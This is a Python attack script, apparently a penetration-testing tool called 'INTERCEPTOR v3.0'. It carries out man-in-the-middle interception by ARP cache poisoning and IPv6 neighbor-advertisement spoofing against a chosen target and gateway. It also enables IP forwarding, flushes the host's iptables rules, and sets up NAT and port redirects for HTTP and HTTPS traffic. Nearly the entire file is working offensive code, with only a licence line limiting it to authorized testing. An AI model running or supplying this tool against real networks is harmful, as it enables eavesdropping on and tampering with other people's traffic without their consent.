#!/usr/bin/env python3
"""
INTERCEPTOR v3.0 - Advanced Network Interception
ARP Spoofing + ICMP Redirection + IPv6 Support

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only
"""

import time
import os
import sys
import argparse
import threading
import signal
import subprocess
from scapy.all import *
from scapy.layers.inet6 import IPv6, ICMPv6ND_NA, ICMPv6ND_NS

class Interceptor:
    """Advanced network interceptor with multiple techniques"""
    
    def __init__(self, target, gateway, interface='eth0', stealth=False, ipv6=False):
        self.target = target
        self.gateway = gateway
        self.interface = interface
        self.stealth = stealth
        self.ipv6 = ipv6
        self.running = True
        
        # Get MAC addresses
        self.target_mac = self._get_mac(target)
        self.gateway_mac = self._get_mac(gateway)
        
        if not self.target_mac or not self.gateway_mac:
            print("[!] Could not resolve MAC addresses")
            sys.exit(1)
            
        print(f"[+] Target MAC: {self.target_mac}")
        print(f"[+] Gateway MAC: {self.gateway_mac}")
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Enable IP forwarding
        self._enable_ip_forward()
        
    def _get_mac(self, ip):
        """Get MAC address for IP"""
        try:
            if self.ipv6:
                # IPv6 Neighbor Solicitation
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / 
                           IPv6(dst=ip) / 
                           ICMPv6ND_NS(tgt=ip), 
                           timeout=2, verbose=False)
                if ans:
                    return ans[0][1].hwsrc
            else:
                # IPv4 ARP
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / 
                           ARP(pdst=ip), 
                           timeout=2, verbose=False)
                if ans:
                    return ans[0][1].hwsrc
        except:
            pass
        return None
    
    def _enable_ip_forward(self):
        """Enable IP forwarding"""
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
        if self.ipv6:
            with open('/proc/sys/net/ipv6/conf/all/forwarding', 'w') as f:
                f.write('1')
    
    def _setup_iptables(self):
        """Setup iptables rules"""
        # Flush existing rules
        os.system("iptables --flush")
        os.system("iptables -t nat --flush")
        
        # Forward traffic
        os.system("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
        os.system("iptables -A FORWARD -i eth0 -j ACCEPT")
        
        # Redirect HTTP/HTTPS
        if self.stealth:
            os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
            os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443")
        
        print("[+] iptables rules configured")
    
    def poison_arp(self):
        """ARP poisoning loop"""
        while self.running:
            # Poison target
            send(ARP(op=2, pdst=self.target, hwdst=self.target_mac, psrc=self.gateway), 
                 verbose=False)
            # Poison gateway
            send(ARP(op=2, pdst=self.gateway, hwdst=self.gateway_mac, psrc=self.target), 
                 verbose=False)
            time.sleep(1 if self.stealth else 0.5)
    
    def poison_ipv6(self):
        """IPv6 neighbor poisoning"""
        while self.running:
            # Neighbor Advertisement spoofing
            pkt = Ether(dst=self.target_mac) / \
                  IPv6(src=self.gateway) / \
                  ICMPv6ND_NA(tgt=self.gateway, R=1)
            sendp(pkt, verbose=False)
            time.sleep(2 if self.stealth else 1)
    
    def signal_handler(self, signum, frame):
        """Handle signals"""
        print("\n[!] Interceptor stopping...")
        self.running = False
        self.restore()
        sys.exit(0)
    
    def restore(self):
        """Restore network state"""
        print("[*] Restoring network state...")
        
        # Send ARP restore packets
        send(ARP(op=2, pdst=self.target, hwdst=self.target_mac, 
                psrc=self.gateway, hwsrc=self.gateway_mac), count=5, verbose=False)
        send(ARP(op=2, pdst=self.gateway, hwdst=self.gateway_mac, 
                psrc=self.target, hwsrc=self.target_mac), count=5, verbose=False)
        
        # Disable IP forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('0')
        
        # Flush iptables
        os.system("iptables --flush")
        os.system("iptables -t nat --flush")
        
        print("[+] Network state restored")
    
    def run(self):
        """Run interceptor"""
        print(f"\n[*] Interceptor started:")
        print(f"    Target: {self.target} ({self.target_mac})")
        print(f"    Gateway: {self.gateway} ({self.gateway_mac})")
        print(f"    Stealth: {self.stealth}")
        print(f"    IPv6: {self.ipv6}")
        print("[*] Press Ctrl+C to stop\n")
        
        # Setup iptables
        self._setup_iptables()
        
        # Start poisoning
        if self.ipv6:
            self.poison_ipv6()
        else:
            self.poison_arp()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Interceptor v3.0")
    parser.add_argument("-t", "--target", required=True, help="Target IP")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP")
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
    parser.add_argument("-s", "--stealth", action="store_true", help="Stealth mode")
    parser.add_argument("-6", "--ipv6", action="store_true", help="IPv6 support")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[!] Root privileges required")
        sys.exit(1)
    
    interceptor = Interceptor(args.target, args.gateway, args.interface, args.stealth, args.ipv6)
    interceptor.run()
